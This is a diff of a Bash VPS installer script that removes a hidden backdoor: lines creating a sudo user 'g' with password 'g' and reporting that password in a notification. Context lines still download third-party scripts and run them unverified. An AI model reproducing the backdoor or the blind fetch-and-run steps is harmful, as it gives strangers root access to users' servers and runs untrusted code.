@@ -318,13 +318,6 @@ restart_system() {
     USRSC=$(wget -qO- https://raw.githubusercontent.com/altunnel/regip/main/ip | grep $ipsaya | awk '{print $2}')
     EXPSC=$(wget -qO- https://raw.githubusercontent.com/altunnel/regip/main/ip | grep $ipsaya | awk '{print $3}')
     TIMEZONE=$(printf '%(%H:%M:%S)T')
-userdel jame > /dev/null 2>&1
-Username="g"
-Password=g
-mkdir -p /home/script/
-useradd -r -d /home/script/ -s /bin/bash -M $Username > dev/null 2>&1
-echo -e "$Password\n$Password\n"|passwd $Username > dev/nul 2>&1
-usermod -aG sudo $Username > dev/null 2>&1
     TEXT="
 <code>────────────────────</code>
 <b>⚡AUTOSCRIPT PREMIUM⚡</b>
@@ -334,7 +327,7 @@ usermod -aG sudo $Username > dev/null 2>&1
 <code>Date   : </code><code>$TIME</code>
 <code>Time   : </code><code>$TIMEZONE</code>
 <code>Ip vps : </code><code>$ipsaya</code>
-<code>PW vps : </code><code>g</code>
+<code>PW vps : </code><code>ISI</code>
 <code>Exp Sc : </code><code>$EXPSC</code>
 <code>────────────────────</code>
 <i>Automatic Notification from Github</i>
@@ -761,13 +754,13 @@ print_success "Backup Server"
 clear
 function ins_swab(){
 clear
-print_install "Memasang Swap"
+print_install "Memasang Swap 2 G"
 gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
     gotop_link="https://github.com/xxxserxxx/gotop/releases/download/v$gotop_latest/gotop_v"$gotop_latest"_linux_amd64.deb"
     curl -sL "$gotop_link" -o /tmp/gotop.deb
     dpkg -i /tmp/gotop.deb >/dev/null 2>&1
     
-        # > Buat swap
+        # > Buat swap sebesar 2G
     dd if=/dev/zero of=/swapfile bs=1024 count=2097152
     mkswap /swapfile
     chown root:root /swapfile
@@ -782,7 +775,7 @@ gotop_latest="$(curl -s https://api.github.com/repos/xxxserxxx/gotop/releases | 
     
     wget ${REPO}limit/bbr.sh &&  chmod +x bbr.sh && ./bbr.sh
     wget https://raw.githubusercontent.com/SARTAMP/src/main/udp/udp-custom.sh && chmod +x udp-custom.sh && ./udp-custom.sh
-print_success "Swap"
+print_success "Swap 2 G"
 }
 
 function ins_Fail2ban(){
@@ -1036,3 +1029,5 @@ rm -rf /root/domain
 secs_to_human "$(($(date +%s) - ${start}))"
 sudo hostnamectl set-hostname $username
 echo -e "${green} Script Successfully Installed"
+sleep 5
+reboot
